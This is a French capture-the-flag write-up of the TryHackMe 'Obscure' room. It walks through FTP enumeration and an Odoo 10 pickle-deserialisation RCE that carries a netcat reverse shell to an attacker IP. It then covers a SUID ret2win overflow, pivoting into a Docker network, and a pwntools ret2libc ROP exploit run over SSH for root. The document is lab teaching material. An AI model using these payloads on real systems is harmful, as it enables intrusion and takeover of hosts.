# THM - Obscure writeup

Lien : https://tryhackme.com/room/obscured

## Etape 1 : discovery
On commence dans un premier temps par scanner la machine, avec Nmap
```
┌──(root㉿kali)-[~]
└─# nmap -sV 10.10.167.211
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-04 22:46 UTC
Nmap scan report for ip-10-10-167-211.eu-west-1.compute.internal (10.10.167.211)
Host is up (0.012s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Werkzeug httpd 0.9.6 (Python 2.7.9)
MAC Address: 02:B1:F5:82:7C:97 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.76 seconds

```

On trouve un service ssh, un service http, et un service ftp.
On commence par le ftp, qui accepte la connexion en anonymous et qui contient un dossier public "pub".
Dedans, une notice, et un binaire
```
┌──(root㉿kali)-[~]
└─# ftp anonymous@10.10.167.211
Connected to 10.10.167.211.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||15581|)
150 Here comes the directory listing.
drwxr-xr-x    2 65534    65534        4096 Jul 24  2022 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||34459|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             134 Jul 24  2022 notice.txt
-rwxr-xr-x    1 0        0            8856 Jul 22  2022 password
226 Directory send OK.
ftp> mget *

```

La notice indique que le binaire sert à retrouver un password. Accessoirement, elle indique aussi le nom du domaine, antisoft.thm

## Etape 2 : binaire password
On va s'occuper du binaire. Il demande un employee ID
```
Password Recovery
Please enter your employee id that is in your email
```
On décompile avec Ghidra, on trouve le code source. Et l'employee ID attendu est dedans (il commence par 97...) ! On peut aussi le voir avec la commande "strings" d'ailleurs
```
┌──(root㉿kali)-[~]
└─# ./password <<<$(strings password | grep ^97)
Password Recovery
Please enter your employee id that is in your email
remember this next time 'xxxxxxxxxxxxxx'
```

## Etape 3 : ODOO CRM
On va pouvoir se connecter sur le site web maintenant. On peut essayer le login "admin@antisoft.thm" et le password qu'on vient de trouver --> ça marche !
C'est le CRM Odoo, en version 10. Une rapide recherche via searchsploit nous indique une RCE possible, avec la marche à suivre

1. On installe le plugin Database Anonymization
2. Via les settings, on anonymise la base de données
3. On génère un pickle malicieux avec le code ci-dessous
4. On démarre un listener (4242)
5. On charge le pickle dans le "dé-anonymiseur" et on lance la "dé-anonymisation"
Le générateur de pickle (python2)
```
import cPickle
import os
import base64
import pickletools

class Exploit(object):
  def __reduce__(self):
    return (os.system, (("rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.239.52 4242 >/tmp/f"),))

with open("exploit.pickle", "wb") as f:
  cPickle.dump(Exploit(), f, cPickle.HIGHEST_PROTOCOL)
```

Hop, on a un shell sur le serveur. On en profite pour prendre le premier flag, dans le home de l'utilisateur courant.
```
$ id
uid=105(odoo) gid=109(odoo) groups=109(odoo)
$ grep odoo /etc/passwd
odoo:x:105:109::/var/lib/odoo:/bin/false
$ cd /var/lib/odoo
$ ls
addons
field_anonymization_main_1.pickle
filestore
flag.txt
sessions
$ cat flag.txt
THM{xxxxxxxxxxxxxxxxxxxxx}
```

## Etape 4 : binaire /ret
Etape suivante : on remarque que sudo n'est même pas installé 😢 On regarde les binaires avec suid
```
$ find / -type f -perm -4000 -ls 2>/dev/null
156001   40 -rwsr-xr-x   1 root     root        40000 Mar 29  2015 /bin/mount
156039   28 -rwsr-xr-x   1 root     root        27416 Mar 29  2015 /bin/umount
156006   44 -rwsr-xr-x   1 root     root        44104 Nov  8  2014 /bin/ping
156007   44 -rwsr-xr-x   1 root     root        44552 Nov  8  2014 /bin/ping6
156022   40 -rwsr-xr-x   1 root     root        40168 May 17  2017 /bin/su
142767  456 -rwsr-xr-x   1 root     root       464904 Mar 25  2019 /usr/lib/openssh/ssh-keysign
156958   40 -rwsr-xr-x   1 root     root        39912 May 17  2017 /usr/bin/newgrp
156863   44 -rwsr-xr-x   1 root     root        44464 May 17  2017 /usr/bin/chsh
156861   56 -rwsr-xr-x   1 root     root        53616 May 17  2017 /usr/bin/chfn
156909   76 -rwsr-xr-x   1 root     root        75376 May 17  2017 /usr/bin/gpasswd
156970   56 -rwsr-xr-x   1 root     root        54192 May 17  2017 /usr/bin/passwd
 10150   12 -rwsr-xr-x   1 root     root         8864 Jul 23  2022 /ret
```
On remarque le dernier, /ret, un binaire un peu étrange. On le récupère en local, on le passe sous ghidra : après avoir lu un buffer de 128 bytes (non contrôlés), on ne fait rien. Mais il y a une fonction "win" qui n'est jamais appelée - mais qui lance un shell.
On va pouvoir faire un exploit, en local, qui lance win. Et il marche
```
#!/usr/bin/python
from pwn import *

elf = ELF("./ret", checksec = False)
p = process("./ret")

offset = 128 + 8

payload = b"a"*offset + p64(elf.symbols.win + 1 )
print(payload)

p.recvuntil("for me?\n")
p.sendline(payload)
p.clean()
p.interactive()
```
On peut se servir du payload directement en remote :
```
(python -c "print(b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaG\x06@\x00\x00\x00\x00\x00')"; cat)|/ret
```
On est passé root. On file voir le flag : 
```
cat /root/root.txt
Well done,my friend, you rooted a docker container.
```
Damned.

## Etape 5 : scan réseau (et /ret le retour)
Pour voir ce qu'on peut trouver d'autre, on va lancer linpeas. On remarque deux choses intéressantes
1. nmap est installé sur le serveur
2. il existe d'autres entrées dans /etc/hosts qui sont intéressantes.
On lance un scan depuis la machine cible sur le voisinage réseau :
```
nmap -sV 172.17.0.1-3
```
On remarque que sur 172.17.0.1:4444, il y a un service qui renvoie la même chose que le binaire /ret.
On rejoue le même exploit sur ce service :
```
(python -c "print(b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaG\x06@\x00\x00\x00\x00\x00')"; cat)|nc 172.17.0.1 4444
Exploit this binary to get on the box!
What do you have for me?
id
uid=1000(zeeshan) gid=1000(zeeshan) groups=1000(zeeshan),27(sudo)
ls
ret
user.txt
cat user.txt
THM{xxxxxxxxxxxxxxxxxxxxx}
```
On a pu pivoter sur une autre machine, et avoir le flag suivant. C'est bien.

## Etape 6 : binaire /exploit_me (local)
Avant de continuer, pour éviter de rebondir de machine en machine, on va mettre notre clef ssh dans les authorized_keys de zeeshan.

Zeeshan a les droits sudo sur tout... mais avec password - sauf sur un binaire assez explicite, /exploit_me en root - et de toutes les façons exploit_me appartient à root, avec suid, donc bon...
On va récupérer exploit_me et exploiter 😝 

Pas de fonction cachée, mais dynamically linked, on va pouvoir exploiter la libc.
1. On extrait les addresses de gets et de puts sur la GOT (une seule suffit en vrai)
2. On fait à chaque fois un appel à puts pour sortir leurs addresses à l'écran
3. On reboucle sur main
4. Grace à nos deux adresses, on peut calculer l'offset de la libc
5. Et donc enfin, lancer un system("/bin/sh")

En local, ça marche bien.
```
#!/usr/bin/python
from pwn import *

elf = context.binary = ELF("./exploit_me", checksec = False)
libc = elf.libc

p = process("./exploit_me")

prefix = b"a" * 40
pop_rdi = p64(next(elf.search(asm("pop rdi; ret"))))
go_gets = p64(elf.got.gets)
go_puts = p64(elf.got.puts)
fn_puts = p64(elf.plt.puts)
fn_main = p64(elf.symbols.main)

# Premier payload : on modifie l'adresse de retour pour appeler un "pop rdi; ret"
# Puis on a l'adresse à poper : l'adresse de gets en mémoire
# Puis on a l'adresse du "ret" de notre gadget : puts - pour afficher l'adresse de gets
# Puis on a l'adresse appelée _après_ le puts : on rerentre dans main
payload = (prefix + pop_rdi + go_gets + fn_puts +
   pop_rdi + go_puts + fn_puts + 
   fn_main)

p.clean()
p.sendline(payload)

# On récupère les adresses pour gets et pour puts - ça permet d'aller voir sur https://libc.rip/ quelle est la version de libc
# Celle qu'on a en local est suffisante pour faire fonctionner l'exploit en local, mais en remote la lib n'est pas la meme
gets_addr = u64(p.recvline().strip().ljust(8, b'\x00'))
puts_addr = u64(p.recvline().strip().ljust(8, b'\x00'))
print("Gets : " + hex(gets_addr)[-5:])
print("Puts : " + hex(puts_addr)[-5:])
libc.address = gets_addr - libc.symbols.gets

bin_sh = p64(next(libc.search(b"/bin/sh")))
system = p64(libc.symbols.system)

# Second payload : on modifie l'adresse de retour pour appeler un "pop rdi; ret"
# Puis on a l'adresse à poper : une adresse quelconque qui contient /bin/sh
# Puis on a l'adresse du "ret" de notre gadget : system (qui va lancer /bin/sh)
payload = prefix + pop_rdi + bin_sh + system

p.clean()
p.sendline(payload)

p.interactive()
```

## Etape 7 (dernière) : binaire /exploit_me (remote)

En remote... on n'a pas forcément la même libc. Il va falloir se servir des addresses leakées pour obtenir la bonne version (via https://libc.rip/). Le code reste globalement le même, une fois lancé une fois on peut obtenir les addresses réelles de gets, de la chaine /bin/sh et de system
```
#!/usr/bin/python
from pwn import *

elf = context.binary = ELF("./exploit_me", checksec = False)
libc = elf.libc

s = ssh(host="10.10.167.211", user="zeeshan")
p = s.run("/exploit_me")

prefix = b"a" * 40
pop_rdi = p64(next(elf.search(asm("pop rdi; ret"))))
go_gets = p64(elf.got.gets)
go_puts = p64(elf.got.puts)
fn_puts = p64(elf.plt.puts)
fn_main = p64(elf.symbols.main)

payload = (prefix + pop_rdi + go_gets + fn_puts +
   pop_rdi + go_puts + fn_puts + 
   fn_main)

p.clean()
p.sendline(payload)

gets_addr = u64(p.recvline().strip().ljust(8, b'\x00'))
puts_addr = u64(p.recvline().strip().ljust(8, b'\x00'))
print("Gets : " + hex(gets_addr)[-5:])
print("Puts : " + hex(puts_addr)[-5:])


offset = gets_addr - 0x6ed90 # adresse trouvée sur libc.rip après la première execution 
bin_sh = p64(offset + 0x18ce57) # idem
system = p64(offset + 0x453a0) # idem

payload = prefix + pop_rdi + bin_sh + system

p.clean()
p.sendline(payload)

p.interactive()
```

Maintenant, y'a plus qu'à
```
┌──(root㉿kali)-[~/2.exp]
└─# ./remote.py 
[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Connecting to 10.10.167.211 on port 22: Done
[*] zeeshan@10.10.167.211:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.0
    ASLR:     Enabled
[+] Opening new channel: '/exploit_me': Done
Gets : dbd90
Puts : dc6a0
[*] Switching to interactive mode
# $ id
uid=0(root) gid=1000(zeeshan) groups=1000(zeeshan),27(sudo)
# $ cat /root/root.txt
THM{xxxxxxxxxxxxxxxxxxxxx}
```

Et voilà !
